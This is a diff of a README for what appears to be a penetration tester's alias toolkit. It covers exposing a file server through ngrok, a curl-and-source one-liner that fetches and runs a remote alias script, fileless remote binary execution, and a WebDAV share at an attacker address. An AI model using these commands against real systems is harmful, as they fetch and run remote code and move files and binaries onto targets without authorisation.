@@ -25,12 +25,35 @@ bang.gitar-safe $AA $AP
 
 `ngrok` enable us to share local port on the internet. The idea is to start `gitar` server locally and then expose the local port on internet using `ngrok`
 
-*Notes: as we use `ngrok` and we do not add certificates we must a use gitar w/o TLS*
+#### "Safe" version
+***~>*** Expose local **HTTPS server** running in a **container**
 
-1. Start `gitar` server: `bang.gitar 127.0.0.1`
-2. Expose the server port on internet: `bang.expose 9237`
+1. Expose the server port on internet: `bang.expose-https 9237`
+`ngrok` output the internet reachable address for your server. Note it (use `https` one preferably)
+2. Start `gitar` HTTPS server in container: `bang.gitar-safe-override [NGROK_HTTPS_URL]`
 
-Ngrok will output the internet reachable address for your server (use `https` one preferably)
+If you have a browser you could now access to files on `[NGROK_HTTPS_URL]/pull`
+
+If you have a shell you could load shortcut to upload/download file with:
+```bash
+curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
+```
+
+#### "Unsafe" version
+***~>*** Expose local **HTTP server**
+
+1. Expose the server port on internet: `bang.expose 9237`
+`ngrok` output the internet reachable address for your server. Note it (use `https` one preferably)
+2. Start `gitar` HTTP server : `bang.gitar-override [NGROK_HTTPS_URL]`
+
+If you have a browser you could now access to files on `[NGROK_HTTPS_URL]/pull`
+
+If you have a shell you could load shortcut to upload/download file with:
+```bash
+curl -s [NGROK_HTTPS_URL]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
+```
+
+*Notes: You could also use `python3 -m http.server 9237` to launch a server (only for "download file" use case)*
 
 ## `fileless-xec`
 
@@ -50,3 +73,19 @@ This will send a local binary to a remote listening `fileless-xec`. The binary w
 bang.flxssend [TARGET_IP]] [TARGET_PORT] [binary]
 ```
 
+## Webdav server
+
+[see](https://blog.ropnop.com/docker-for-pentesters/#example-6---serving-files-over-webdav)
+
+This enable us to share all files of current directory trough a webdav server
+
+```
+bang.webdavhere
+```
+
+You can now access file from a remote machine (Windows) with the UNC path: ` \\[ATTACKER_ADDR]@[ATTACKER_PORT]\share`
+
+You could eventually expose server behind a internet address using `ngrok` (if you are behdin an NAT for exemple):
+```
+bang.expose 8080
+```
